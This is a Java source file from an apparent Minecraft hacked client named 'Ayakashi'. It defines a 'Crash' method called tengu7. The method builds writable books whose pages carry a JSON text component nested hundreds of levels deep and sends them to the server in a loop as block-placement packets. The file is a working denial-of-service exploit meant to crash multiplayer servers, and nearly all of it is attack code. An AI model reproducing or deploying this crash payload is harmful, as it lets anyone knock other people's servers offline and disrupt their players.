package Ayakashi.methods.impl;

import Ayakashi.helpers.ChatHelper;
import Ayakashi.methods.Crash;
import Ayakashi.methods.CrashInfo;
import Ayakashi.mods.notifications.Notification;
import Ayakashi.mods.notifications.NotificationManager;
import Ayakashi.mods.notifications.NotificationType;
import io.netty.buffer.Unpooled;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.util.BlockPos;

@CrashInfo(
        name = "tengu7"
)
public class CrashTengu7 extends Crash {
    public void execute(Object... args) {
        int packets = (Integer) args[0];
        long start = System.currentTimeMillis();
        NotificationManager.show(new Notification(NotificationType.INFO, ChatHelper.fix("&4Ayakashi"), "Tengu method started!", 4));
        ChatHelper.sendMessage(String.format("Sending packets &8(&f%s&8) &8[&f%s&8]", this.getName().toUpperCase(), args[0]));
        (new Thread(() -> {
            for (int f = 0; f < packets; f++) {
                NBTTagCompound comp = new NBTTagCompound();
                NBTTagList list = new NBTTagList();
                for (int i = 0; i < 5; i++)
                    list.appendTag(new NBTTagString("{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:}],text:a}"));
                comp.setString("author", Minecraft.getMinecraft().getSession().getUsername());
                comp.setString("title", "Ayakashi");
                comp.setByte("resolved", (byte) 1);
                comp.setTag("pages", list);
                ItemStack stack = new ItemStack(Items.writable_book);
                stack.setTagCompound(comp);
                PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
                buffer.writeItemStackToBuffer(stack);
                Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C08PacketPlayerBlockPlacement(new BlockPos((Minecraft.getMinecraft()).thePlayer.posX, (Minecraft.getMinecraft()).thePlayer.posY - 2.0D, (Minecraft.getMinecraft()).thePlayer.posZ), 1, stack, 0.0F, 0.0F, 0.0F));
            }
        })).start();
        ChatHelper.sendMessage(String.format("Packets has been sent &8(&f%sms&8)", System.currentTimeMillis() - start));
    }
}
